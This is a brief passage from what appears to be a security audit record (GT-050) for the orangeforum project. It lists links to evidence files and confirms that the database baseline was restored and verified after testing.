**Evidence files**: [GT-050.json](audit/orangeforum/evidence/GT-050.json), [GT-050_gt050_user1_edit_form.html](audit/orangeforum/evidence/GT-050_gt050_user1_edit_form.html), [orangeforum audit log](audit/orangeforum/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---
